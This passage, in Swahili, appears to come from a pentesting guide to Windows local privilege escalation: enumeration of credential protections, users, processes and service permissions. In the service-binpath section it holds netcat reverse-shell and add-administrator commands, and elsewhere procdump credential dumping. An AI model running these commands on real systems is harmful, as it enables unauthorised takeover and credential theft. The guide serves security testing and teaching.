
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** imeundwa kwa ajili ya **usimamizi wa nywila za Administrator za ndani**, kuhakikisha kwamba kila nywila ni **ya kipekee, inazalishwa bila mpangilio maalum, na inasasishwa mara kwa mara** kwenye kompyuta zilizojiunga na domain. Nywila hizi huhifadhiwa kwa usalama ndani ya Active Directory na zinaweza kufikiwa tu na watumiaji waliopewa ruhusa za kutosha kupitia ACLs, hivyo kuwawezesha kuona nywila za admin za ndani ikiwa wameidhinishwa.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Ikiwa imewashwa, **nywila za maandishi wazi huhifadhiwa kwenye LSASS** (Local Security Authority Subsystem Service).\
[**Maelezo zaidi kuhusu WDigest kwenye ukurasa huu**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

Kuanzia **Windows 8.1**, Microsoft ilianzisha ulinzi ulioimarishwa wa Local Security Authority (LSA) ili **kuzuia** michakato isiyoaminika kujaribu **kusoma kumbukumbu yake** au kuingiza msimbo, hivyo kuimarisha usalama wa mfumo.\
[**Maelezo zaidi kuhusu LSA Protection hapa**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** ilianzishwa katika **Windows 10**. Kusudi lake ni kulinda credentials zilizohifadhiwa kwenye kifaa dhidi ya vitisho kama vile mashambulizi ya pass-the-hash. [**Maelezo zaidi kuhusu Credential Guard yanapatikana hapa.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Vitambulisho Vilivyohifadhiwa kwenye Akiba

**Vitambulisho vya domain** huthibitishwa na **Local Security Authority** (LSA) na hutumiwa na vipengele vya mfumo wa uendeshaji. Data za kuingia za mtumiaji zinapothibitishwa na kifurushi cha usalama kilichosajiliwa, kwa kawaida vitambulisho vya domain vya mtumiaji huwekwa.\
[**Maelezo zaidi kuhusu Vitambulisho Vilivyohifadhiwa kwenye Akiba hapa**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Watumiaji na Vikundi

### Orodhesha Watumiaji na Vikundi

Unapaswa kuangalia kama kuna vikundi unavyoshiriki vilivyo na ruhusa muhimu.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Vikundi vyenye marupurupu

Ikiwa **upo katika kikundi fulani chenye marupurupu, unaweza kuongeza kiwango cha marupurupu yako**. Jifunze kuhusu vikundi vyenye marupurupu na jinsi ya kuvitumia vibaya ili kuongeza kiwango cha marupurupu hapa:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Udanganyifu wa token

**Jifunze zaidi** kuhusu maana ya **token** kwenye ukurasa huu: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Angalia ukurasa ufuatao ili **ujifunze kuhusu token zinazovutia** na jinsi ya kuzitumia vibaya:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Watumiaji walioingia / Vipindi

```bash
qwinsta
klist sessions
```

### Folda za nyumbani

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Sera ya Nenosiri

```bash
net accounts
```

### Pata maudhui ya ubao wa kunakili

```bash
powershell -command "Get-Clipboard"
```

## Michakato Inayoendelea

### Ruhusa za Faili na Folda

Kwanza kabisa, unapoorodhesha michakato **angalia kama kuna nywila kwenye command line ya mchakato**.\
Angalia kama unaweza **kubadilisha binary inayoendeshwa** au kama una ruhusa za kuandika kwenye folda ya binary ili kutumia uwezekano wa mashambulizi ya [**DLL Hijacking**](dll-hijacking/index.html):

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Daima kagua kama kuna [**electron/cef/chromium debuggers** zinazoendesha; unaweza kuzitumia vibaya kufanya privilege escalation](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

Listener ya debugger inaweza kudumu kwa muda mfupi, kwa hivyo kutokuwepo kwake kwenye snapshot moja tuli ya ports hakuthibitishi kwamba haikuwahi kufichuliwa. Linganisha listener yoyote iliyoonekana na PID yake, mmiliki wa mchakato, na uwezo wa mtumiaji mwenye privileges za chini kuifikia; jina la programu au debug flag pekee havithibitishi utekelezaji wa code kati ya watumiaji. Fanya enumeration ya kawaida kwa njia tulivu badala ya kutuma amri za debugger.

**Kukagua ruhusa za binary za michakato**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Kukagua ruhusa za folda ambamo binary za michakato zipo (**[**DLL Hijacking**](dll-hijacking/index.html)**)****

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Saraka za dynamic preprocessor za Snort

Snort 2 inaweza kupakia shared libraries kutoka kwenye `dynamicpreprocessor directory` iliyotajwa kwenye usanidi uliochaguliwa kwa `snort.exe -c <config>`. Kwa scheduled task au service inayoendesha Snort chini ya akaunti tofauti, kagua usanidi huo mahususi na ACL ya saraka ya module iliyotajwa. Ikiwa token yako inaweza kuunda faili humo, njia hiyo inafaa kuchunguzwa kama sehemu inayoweza kuruhusu code execution task au service hiyo itakapopakia modules tena. Thibitisha ruhusa halisi za akaunti ya run-as, usanidi unaotumika, uoanifu wa module, na vizuizi vyovyote vya deny au share; saraka inayoweza kuandikwa pekee haithibitishi escalation. [Nyaraka za Snort kuhusu dynamic-preprocessor](https://www.snort.org/documents/dpx-readme) zinaeleza upakiaji wa module wakati wa runtime.

### Web service yenye upendeleo na document root inayoweza kuandikwa

Kwenye usakinishaji wa Apache wa Windows, linganisha njia ya executable ya service na akaunti yake ya run-as na `DocumentRoot` iliyo kwenye `httpd.conf` inayotumika. Kwa mpangilio wa kawaida wa XAMPP, kagua `C:\xampp\apache\conf\httpd.conf` na ACL ya document root iliyosanidiwa, ambayo mara nyingi huwa `C:\xampp\htdocs`. Ikiwa mtumiaji mwenye upendeleo wa chini anaweza kuunda faili kwenye root hiyo huku Apache ikiendeshwa kama `LocalSystem`, server-side code execution inaweza kuvuka mpaka wa upendeleo wa host. Thibitisha kuwa service inaendeshwa, kuwa njia hiyo mahususi inatolewa, na kuwa handler ya upande wa server inachakata aina hiyo ya faili; root inayoweza kuandikwa peke yake inathibitisha tu uwezo wa kuunda faili. Kagua ACL bila kuandika faili ya majaribio:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Kwa usakinishaji wa kawaida wa WAMP, huduma inaweza kuelekeza kwenye `C:\wamp64\bin\apache\apache*\bin\httpd.exe` yenye toleo maalum (au `C:\wamp\...` kwa mpangilio wa biti 32), huku usanidi ukiwa karibu nayo chini ya `conf\httpd.conf` na root chaguomsingi ikiwa `C:\wamp64\www` au `C:\wamp\www`. Kagua pamoja picha halisi ya huduma, utambulisho inayotumia kuendesha, `DocumentRoot` inayotumika (pamoja na upanuzi wa `${INSTALL_DIR}` na mabadiliko ya virtual-host), na ACL ya root. Directory ya WAMP inayoweza kuandikwa haithibitishi kwamba Apache inaendeshwa kama `SYSTEM` au kutekeleza faili iliyowasilishwa. [Apache inaeleza jinsi huduma ya Windows huchagua usanidi wake](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Root ya IIS inayoweza kuandikwa na utambulisho wa network wa application pool

Kwa IIS, linganisha directory halisi inayoweza kuandikwa na **site/application inayotumika** katika `applicationHost.config`, kisha tambua pool yake iliyosanidiwa na handler ya upande wa server. Code iliyowekwa kwenye directory inayotolewa kwa watumiaji huendeshwa kama pool tu ikiwa IIS inachakata aina hiyo ya faili na route inaweza kufikiwa. Kagua ruhusa za mtumiaji wa sasa za kuunda faili, hali ya runtime ya site, handler na mabadiliko yanayotumika kwa njia husika kabla ya kuchukulia directory inayoweza kuandikwa kama njia ya kutekeleza code.

Uchanganishaji wa ASP.NET unaofanyika wakati wa runtime unatoa njia tofauti ya kukagua: faili zinazozalishwa chini ya directory ya uchanganishaji ya application. Chaguomsingi ni directory ya `Temporary ASP.NET Files` iliyo chini ya usakinishaji husika wa .NET Framework, lakini `<compilation tempDirectory>` ya application inaweza kuibadilisha. [Microsoft inaeleza mahali ilipo na subdirectory za kila application](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) na [inapendekeza kutenganisha directory za uchanganishaji wakati application pool haziaminiani](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Ikiwa tokeni yenye mapendeleo ya chini inaweza kubadilisha source iliyozalishwa kwenye cache ya **application mahususi**, bainisha kama application hiyo itachanganua upya source hiyo chini ya [utambulisho wa worker process](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) wenye mapendeleo zaidi. ACL ya faili au directory pekee haithibitishi utekelezaji wa code: linganisha cache na application inayotumika, tokeni na ACL zinazotumika, mipangilio ya uchanganishaji, utambulisho wa process, na muda wa uchanganishaji upya wowote. Tumia ukaguzi wa metadata wa kusoma tu; usianzishe uchanganishaji wala kubadilisha faili za cache wakati wa enumerating.

Pool ya IIS iliyosanidiwa kama `ApplicationPoolIdentity` au `NetworkService` kwa kawaida hujithibitisha kwa rasilimali za domain kama **account ya kompyuta mwenyeji**, ingawa tokeni yake ya ndani inaweza kuwa na mapendeleo ya chini. `LocalSystem` tayari ina mapendeleo makubwa ndani ya kompyuta na pia hutumia account ya kompyuta kwenye network; `LocalService` kwa kawaida hutumia credentials za network zisizotambulishwa. Pool ya `SpecificUser` hutumia account yake iliyosanidiwa. [Microsoft inaeleza aina hizi za utambulisho](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) na [utambulisho wa network wa application pool](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Mpangilio wa utambulisho usioainishwa unaweza kurithi chaguomsingi za pool, ambazo hutofautiana kati ya vizazi vya IIS, kwa hiyo bainisha usanidi unaotumika badala ya kukisia kutokana na jina la pool. Ikiwa utekelezaji wa code unafikia pool yenye utambulisho wa network wa account ya kompyuta, tathmini ruhusa za directory za **kompyuta hiyo mahususi**. [DCSync](../active-directory-methodology/dcsync.md) inahitaji ruhusa za replication kwenye domain naming context; tiketi ya machine-account au jukumu la host pekee havithibitishi ruhusa hizo. Enumeration isiyofanya mabadiliko inapaswa kukagua usanidi na ACL bila kupakia faili, kuanzisha uthibitishaji wa network, au kuomba tiketi.

Kwa handler ya ASP.NET inayosomeka na kuanzisha helper process, fuatilia thamani yoyote inayotokana na request kupitia uthibitishaji, decryption, validation na uundaji wa command. Handler inayounganisha tokeni iliyodecode kwenye `ProcessStartInfo("cmd", "/c ...")` inaweza kuruhusu alama maalum za shell kubadilisha command; [Microsoft inaeleza herufi maalum za `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Thibitisha kwamba caller asiyeaminika anaweza kweli kuathiri thamani iliyodecode na kufikia handler, kisha bainisha utambulisho unaotumika wa application pool au wa impersonation, pamoja na utambulisho wa child process. Mstari wa source unaosomeka, listener ya localhost, au udhaifu wa muundo wa tokeni pekee havithibitishi utekelezaji wa command wenye mapendeleo. Kagua source na usanidi wa pool bila kutuma request zilizoghushiwa au kuendesha helper wakati wa enumeration isiyofanya mabadiliko.

Kwa huduma ya PHP kwenye Windows, njia inayodhibitiwa na request na kupitishwa kwa [`include` au `require`](https://www.php.net/manual/en/function.include.php) inaweza kutekeleza faili ya PHP inayoweza kuandikwa na mtumiaji wa chini, kwa utambulisho wa worker. Thibitisha kwamba request inaweza kufikia kauli hiyo, njia iliyotatuliwa inaelekeza kwenye faili ambayo mtumiaji wa chini anaweza kurekebisha na worker anaweza kusoma, vizuizi husika vya njia za PHP vinaruhusu include, na worker inaendeshwa kwa mapendeleo ya juu zaidi. Listener ya loopback au faili inayoweza kuandikwa pekee haithibitishi mnyororo huu; kagua source, utambulisho wa huduma na ACL za faili bila kuita endpoint wakati wa enumeration isiyofanya mabadiliko.

### Uchimbaji wa nywila kutoka kwenye kumbukumbu

Unaweza kuunda memory dump ya process inayoendesha kwa kutumia **procdump** kutoka sysinternals. Huduma kama FTP huwa na **credentials zilizo wazi kwenye kumbukumbu**; jaribu kudump kumbukumbu na kusoma credentials.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Programu za GUI zisizo salama

**Programu zinazoendeshwa kama SYSTEM zinaweza kumruhusu mtumiaji kufungua CMD au kuvinjari saraka.**

Mfano: "Windows Help and Support" (Windows + F1), tafuta "command prompt", bofya "Click to open Command Prompt"

### Uingizaji wa faili za mradi zenye ruhusa za juu

Programu inayofungua kiotomatiki miradi kutoka kwenye saraka ya kushusha faili inayoweza kuandikwa na mtumiaji mwenye ruhusa za chini huvuka mpaka wa uaminifu wa ingizo chini ya akaunti ya programu inayoingiza. Kagua **njia halisi inayoweza kuandikwa**, mchakato au kazi inayoifungua, utambulisho wake unaotumika, na toleo la parser. [Tatizo la kihistoria la kufungua/kurejesha mradi wa Ghidra](https://github.com/NationalSecurityAgency/ghidra/issues/71) liliruhusu XML external entities kwenye metadata ya mradi; entity ya mtandao kwenye Windows inaweza kusababisha uthibitishaji kutoka kwa akaunti inayoingiza ikiwa [sera za SMB na NTLM za kutoka](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking) zinaruhusu. Hii ni dalili ya uwezekano wa kufichuliwa kwa vitambulisho, si ufikiaji wa msimamizi wa moja kwa moja: jibu lazima liweze kutumiwa kupitia njia tofauti iliyoidhinishwa au yenye udhaifu, na build za sasa lazima zikaguliwe kulingana na hali halisi ya viraka vyake. Usifungue mradi uliotengenezwa kwa makusudi wakati wa enumeration ya pasivu; kagua mtiririko wa uingizaji na ACL.

## Services

Haki ya [`SC_MANAGER_CREATE_SERVICE` ya kitu cha Service Control Manager (SCM)](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) ni tofauti na haki kwenye service iliyopo. Ombi la ufikiaji la kusoma tu la [`OpenSCManager`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) likifaulu kwa haki hiyo ni dalili ya kuchunguza, si uthibitisho kwamba service mpya inaweza kuendeshwa. [`CreateService` hurejesha handle](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) yenye haki za service zilizoombwa wakati wa uundaji; kuifungua tena service baadaye hufanya ukaguzi tofauti wa ufikiaji na kunaweza kushindwa hata kama handle ya awali ingeweza kutumiwa. Hakiki kando tokeni halisi ya eneo husika au ya mbali, haki za handle zilizopewa, akaunti ya service, sera ya kuanzisha, na njia ya executable. Usitengeneze wala kuanzisha service wakati wa enumeration ya pasivu.

Kwa njia ya kusakinisha service kwa mbali, linganisha haki hizo za SCM na share kwenye lengo ambayo **logon ileile ya mtandao** inaweza kuandikia, ACL yake ya NTFS, na njia ya executable ya ndani ambayo akaunti ya service inaweza kuendesha. Akaunti isiyo ya msimamizi inaweza kuvuka mpaka huu ikiwa kuna haki pana zisizo za kawaida za SCM na njia ya kuweka faili zote mbili; share ya msimamizi si sharti la lazima. Ufikiaji wa kuandika kwenye share pekee, au dalili pekee ya ruhusa ya kuunda service ya SCM, hauthibitishi kwamba service mpya inaweza kuanza ikiwa na utambulisho wa juu zaidi.

Service iliyopo inaweza kuita executable saidizi wakati wa kuanzisha, kuzima, au tukio jingine la mzunguko wa maisha, hata kama executable hiyo haipo kwenye `ImagePath` yake. Ikiwa jina la executable saidizi linatatuliwa kuwa saraka inayoweza kuandikwa na mtumiaji mwenye ruhusa za chini na service inaendeshwa kwa utambulisho wa juu zaidi, faili saidizi inayokosekana inaweza kuwa mgombea wa kubadilishwa kwa masharti. Thibitisha **msimbo halisi wa service au mwito wa executable saidizi ulioandikwa kwenye nyaraka**, njia na mpangilio wa utafutaji wa executable iliyotatuliwa, ruhusa za kuunda saraka, utambulisho wa service, na kichocheo cha mzunguko wa maisha kinachopatikana. Saraka ya service inayoweza kuandikwa au faili inayokosekana pekee haithibitishi kwamba service itapakia faili hiyo; ukaguzi wa pasivu haupaswi kuanzisha wala kusimamisha service.

Kwa service iliyopo, [`SERVICE_START huruhusu kutoa argument kwa StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); ni tofauti na [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Kagua msimbo wa service au kiolesura kilichoandikwa kwenye nyaraka kabla ya kuchukulia ruhusa ya kuanzisha kama zaidi ya haki ya kuidhibiti. Ikiwa inatumia argument iliyochaguliwa na mpigaji kama njia ya logi au export, hakiki utambulisho wa service, mtiririko halisi kutoka argument hadi uandishi, vizuizi vya njia, na ruhusa za **faili iliyoundwa**. Uandishi kwenye saraka iliyolindwa unaweza kusababisha escalation tu ikiwa kuna mtumiaji au loader mwingine mwenye ruhusa za juu anayekubali faili hiyo; logi inayoweza kuandikwa au ruhusa ya kuanzisha pekee haitoshi. Orodha ya pasivu haipaswi kuanzisha service wala kuunda faili ya majaribio.

Kwa wakala wa ufuatiliaji wa NSClient++, faili ya `nsclient.ini` inayosomeka ni **dalili ya kukagua usanidi**: inaweza kuwa na vitambulisho vya web, huku `boot.ini` ikiweza kuelekeza usanidi kwenye eneo jingine. Kagua akaunti halisi ya service, listener ya WEB na sera ya ufikiaji, na kama role iliyothibitishwa inaweza kubadilisha mipangilio au scripts. Utekelezaji wenye ruhusa za juu pia unahitaji `CheckExternalScripts` (au njia nyingine ya utekelezaji iliyowezeshwa), haki halisi ya kusajili au kurekebisha amri, na kichocheo kinachoitekeleza chini ya utambulisho wa service. Listener inayosikiliza loopback pekee bado inaweza kufikiwa na mtumiaji wa ndani, lakini njia ya faili, nenosiri, au listener pekee havithibitishi haki hizo. Kagua metadata na ruhusa bila kuonyesha siri au kuita web API wakati wa enumeration ya pasivu. Tazama [mpangilio wa faili za NSClient++](https://nsclient.org/docs/concepts/file-layout/), [mwongozo wa usalama wa web na scripts](https://nsclient.org/docs/setup/securing/), na [usanidi wa external-script](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

Kwa service ambayo `ImagePath` yake ni `nssm.exe`, kagua akaunti halisi ya kuendeshea service na thamani yake ya `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM huhifadhi programu child hapo](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), huku `AppDirectory` ikiwa saraka yake ya kufanya kazi iliyosanidiwa. Kagua executable ya child na ACL za saraka zake za juu kabla ya kuchukulia ruhusa za wrapper kuwa ndizo pekee zinazoweka mpaka wa service. Endpoint ya ndani ya WCF au SOAP inayofichuliwa na child hiyo ni dalili tofauti ya kuchunguza: thibitisha kwamba mtumiaji mwenye ruhusa za chini anaweza kufikia listener, operesheni halisi inakubali ingizo lake, na child ya service inatekeleza operesheni isiyo salama chini ya utambulisho wa juu zaidi. Akaunti ya service, URL ya endpoint, au njia inayoweza kuandikwa pekee havithibitishi escalation; epuka kuita operesheni za service wakati wa enumeration ya pasivu.

Kwa operesheni maalum ya WCF, fuatilia mfuatano unaodhibitiwa na mpigaji hadi kwenye PowerShell runspace yoyote. [`Pipeline.Commands.AddScript huongeza maandishi ya script`](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), na [`Pipeline.Invoke huendesha pipeline`](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [`netTcpBinding yenye vitambulisho vya usafirishaji vya Windows`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) huthibitisha mteja, lakini ruhusa ya kuita operesheni **hiyo mahususi** na utambulisho halisi wa runspace lazima vikaguliwe tofauti. Njia kutoka kwenye ingizo la mpigaji mwenye ruhusa za chini hadi `AddScript` chini ya utambulisho wa service wenye ruhusa za juu ni mpaka wa utekelezaji wa msimbo; port inayosikiliza, mteja aliyethibitishwa, au method isiyotumika kwenye assembly isiyohusiana pekee si uthibitisho. Kagua service iliyowekwa, mkataba, uidhinishaji na mipangilio ya impersonation kwa njia tuli, bila kuita endpoint wakati wa enumeration.

Service Triggers huruhusu Windows kuanzisha service hali fulani zinapotokea (shughuli ya named pipe/RPC endpoint, matukio ya ETW, upatikanaji wa IP, kifaa kuunganishwa, GPO refresh, n.k.). Hata bila haki za SERVICE_START, mara nyingi unaweza kuanzisha services zenye ruhusa za juu kwa kuwasha triggers zake. Tazama mbinu za enumeration na uanzishaji hapa:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Huduma ya Visual Studio ya kukusanya taarifa za uchunguzi

Usakinishaji wa Visual Studio wenye zana za C/C++ unaweza kujumuisha `VSStandardCollectorService150`, service ya uchunguzi iliyosanidiwa kuendeshwa kama `LocalSystem`. [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) ilitumia race ya junction na object-manager-link kuelekeza upya uwekaji upya wa DACL ya service. Escalation iliyoonyeshwa pia ilihitaji njia inayoweza kutumiwa ya kurekebisha MSI ya Visual Studio Setup WMI Provider na lengo lake la `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Kipengele hicho kilirekebishwa Januari 2024.

Kwa triage ya pasivu, kagua akaunti na njia ya binary ya service hiyo, angalia kama njia ya Setup WMI compiler ipo, na hakiki hali ya viraka ya kipengele kilichosakinishwa. Ingizo la service, toleo la bidhaa ya Visual Studio, au faili ya compiler pekee havithibitishi kwamba host ina udhaifu. Ukaguzi hauhitaji kuanzisha service au kuendesha repair.

Pata orodha ya services:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Ruhusa

Unaweza kutumia **sc** kupata taarifa kuhusu huduma.

```bash
sc qc <service_name>
```

Inapendekezwa kuwa na binary **accesschk** kutoka _Sysinternals_ ili kuangalia kiwango cha ruhusa kinachohitajika kwa kila huduma.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Inapendekezwa kuangalia ikiwa "Authenticated Users" wanaweza kurekebisha huduma yoyote:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Unaweza kupakua accesschk.exe ya XP hapa](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Washa service

Ikiwa unapata hitilafu hii (kwa mfano, na SSDPSRV):

_Hitilafu ya mfumo 1058 imetokea._\
_Service haiwezi kuwashwa, ama kwa sababu imezimwa au kwa sababu hakuna vifaa vilivyowezeshwa vinavyohusishwa nayo._

Unaweza kuiwasha kwa kutumia

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Zingatia kwamba huduma ya upnphost hutegemea SSDPSRV ili kufanya kazi (kwa XP SP1)**

**Njia nyingine ya kutatua** tatizo hili ni kuendesha:

```
sc.exe config usosvc start= auto
```

### **Badilisha njia ya binary ya service**

Katika hali ambapo kundi la "Authenticated users" lina **SERVICE_ALL_ACCESS** kwenye service, inawezekana kubadilisha binary inayotekelezeka ya service. Ili kurekebisha na kutekeleza **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Anzisha upya huduma

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Mapendeleo yanaweza kuongezwa kupitia ruhusa mbalimbali:

- **SERVICE_CHANGE_CONFIG**: Huruhusu kusanidi upya binary ya service.
- **WRITE_DAC**: Huruhusu kusanidi upya ruhusa, na hivyo kuwezesha kubadilisha usanidi wa service.
- **WRITE_OWNER**: Huruhusu kupata umiliki na kusanidi upya ruhusa.
- **GENERIC_WRITE**: Hurithi uwezo wa kubadilisha usanidi wa service.
- **GENERIC_ALL**: Pia hurithi uwezo wa kubadilisha usanidi wa service.

Kwa ajili ya kugundua na kutumia udhaifu huu, _exploit/windows/local/service_permissions_ inaweza kutumika.

### Ruhusa dhaifu za service binaries

Ikiwa service inaendeshwa kama **`LocalSystem`**, **`LocalService`**, **`NetworkService`**, au akaunti ya domain yenye mapendeleo, lakini **watumiaji wenye mapendeleo ya chini wanaweza kurekebisha EXE ya service au folda yake kuu**, mara nyingi service inaweza kutekwa **kwa kubadilisha binary na kuwasha upya service**.

**Angalia kama unaweza kurekebisha binary inayoendeshwa na service** au kama una **ruhusa za kuandika kwenye folda** ambako binary iko ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Unaweza kupata kila binary inayoendeshwa na service kwa kutumia **wmic** (si katika system32) na kuangalia ruhusa zako kwa kutumia **icacls**:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Unaweza pia kutumia **sc** na **icacls**:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Tafuta ACL hatari zilizotolewa kwa **`Everyone`**, **`BUILTIN\Users`**, au **`Authenticated Users`**, hasa **`(F)`**, **`(M)`**, au **`(W)`** kwenye faili inayotekelezeka ya service au kwenye directory inayoihifadhi. Mtiririko wa vitendo wa kuitumia vibaya ni:<sup>[[27]](#references)</sup>

1. Thibitisha akaunti ya service na njia ya faili inayotekelezeka kwa kutumia `sc qc <service_name>`.
2. Thibitisha kwamba binary inaweza kuandikwa kwa kutumia `icacls <path>`.
3. Badilisha binary ya service na payload au binary halali ya service yenye madhara.
4. Anzisha upya service kwa kutumia `sc stop <service_name> && sc start <service_name>` (au subiri kuwashwa upya kwa kompyuta / kichochezi cha service).

Ukaguzi wa kiotomatiki unaofaa:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Ikiwa huduma hairuhusu mtumiaji wa kawaida kuiwasha upya, angalia ikiwa inaanza kiotomatiki wakati wa kuwasha kompyuta, ina hatua ya kushughulikia hitilafu inayoianzisha upya, au inaweza kuanzishwa kwa njia isiyo ya moja kwa moja na programu inayoitumia.

### Ruhusa za kurekebisha registry ya huduma

Unapaswa kuangalia ikiwa unaweza kurekebisha registry yoyote ya huduma.\
Unaweza **kuangalia** **ruhusa** zako kwenye **registry** ya huduma kwa kufanya:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

